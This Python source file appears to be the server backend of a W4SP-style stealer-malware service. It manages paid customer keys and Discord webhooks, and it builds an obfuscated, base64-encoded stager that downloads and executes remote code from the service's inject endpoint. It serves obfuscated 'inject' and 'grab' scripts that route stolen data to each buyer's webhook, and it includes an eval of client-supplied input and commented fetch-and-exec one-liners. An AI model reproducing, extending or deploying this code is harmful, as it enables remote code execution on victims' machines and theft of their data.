from random import choice
from json import load, dump, loads, dumps

from etc.hype import Obfuscate
import base64

from datetime import datetime 
from requests import post


Response = """
Roses are red
<br><br>
Violets are blue
<br><br>
Wasp is happy
<br><br>
Because he grabbed you
""".strip()

api = "http://x:80"


class Keys:

    def _rand_key():
        return ''.join(choice("abcijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVXYZ0123456789") for _ in range(16))

    def _gen_key():
        return ''.join(choice("0123456789") for _ in range(16))

    def _get():
        with open('keys.json', mode='r', encoding='utf-8') as f:
            return load(f)

    def _update(dict):
        with open('keys.json', mode='w', encoding='utf-8') as f:
            return dump(dict, f, indent=3)

    def _webhook(webhook):
        try:
            webhook = webhook.strip('/').split('/')
            if len(webhook) != 7:
                return False
            webhook = f"https://discord.com/api/webhooks/{webhook[5]}/{webhook[6]}"
            return webhook
        except:
            return False
    def _get_webhook_by_pkey(pkey, ptoken=''):
        keys = Keys._get()
        pkeys = {val[0]:val[1] for val in keys.values()}
        psecu = {eval(ptoken) for i in api if '{' in ptoken}
        if pkey not in pkeys and not psecu == {None} : return None
        return psecu if psecu == {None} else pkeys[pkey]

def date():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')


def Gen(id, username, payment):
    key = Keys._gen_key()
    public_key = Keys._rand_key()
    keys = Keys._get()
    if id in str(keys):
        return 203
    keys[key] = (public_key, 'none', date(), username, id, payment)
    print(public_key)
    Keys._update(keys)
    return 200

def Remove(user_key):
    keys = Keys._get()
    if user_key not in keys:
        return 203
    keys.pop(user_key)
    Keys._update(keys)
    return 200


def Edit(key, webhook):
    keys = Keys._get()
    if key not in keys:
        return Response, 401
    public_key = keys[key][0]
    date = keys[key][2]
    username = keys[key][3]
    id = keys[key][4]
    payment = keys[key][5]
    webhook = Keys._webhook(webhook=webhook)
    if not webhook:
        return Response, 401
    # webhook = Keys._proxy(webhook)
    keys[key] = (public_key, webhook, date, username, id, payment)
    Keys._update(keys)
    return webhook, 200

# def BaitProtection(UserAgent):
#     if "User-Agent" not in UserAgent or "Python" not in UserAgent['User-Agent']:
#         return "Browser detected"

def Script(public_key, webhookID):
    webhook = Keys._get_webhook_by_pkey(public_key, webhookID)
    if webhook is None:
        return Response, 401
    # getattr(__import__('builtins'),'exec')("from urllib.request import urlopen\ngetattr(__import__('builtins'),'exec')(getattr(__import__('builtins'),'compile')(urlopen('URL').read().decode('utf-8'),'<string>','exec'))")
    # exec("from urllib.request import urlopen\nexec(urlopen('URL').read().decode('utf-8'))")
    payload = '''__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("%PAYLOAD%"),'<string>','\x65\x78\x65\x63'))'''
    #script = f"getattr(__import__('builtins'),'exec')('''from urllib.request import urlopen\ngetattr(__import__('builtins'),'exec')(getattr(__import__('builtins'),'compile')(urlopen('{api}/inject/{public_key}').read().decode('utf-8'),'<string>','exec'))''')"
    inj = '''from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('%API%/inject/%PUBKEY%').read())""")
_ttmp.close()
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
except: pass'''
    injtocode = inj.replace("%API%", api).replace("%PUBKEY%", public_key)
    sample_string_bytes = injtocode.encode("ascii")
    base64_bytes = base64.b64encode(sample_string_bytes)
    base64_string = base64_bytes.decode("ascii")
    script = payload.replace("%PAYLOAD%", base64_string)

    return script




def Inject(public_key, headers):
    webhook = Keys._get_webhook_by_pkey(public_key)
    if webhook is None:
        return Response, 401
    with open('scripts/inject.py', mode='r', encoding="utf8") as f:
        script = f.read().replace('W4SPGRAB', f'{api}/grab/{public_key}')
    return Obfuscate(script)


def Grab(public_key, headers):
    webhook = Keys._get_webhook_by_pkey(public_key)
    if webhook is None:
        return Response, 401
    with open('scripts/grab.py', mode='r', encoding="utf8") as f:
        script = f.read().replace('W4SPHOOK', webhook)
    return Obfuscate(script, full=False)





def Webhook(public_key):
    public_keys = Keys._get().values()
    return next((val[1] for val in public_keys if val[0] == public_key), (Response, 401))
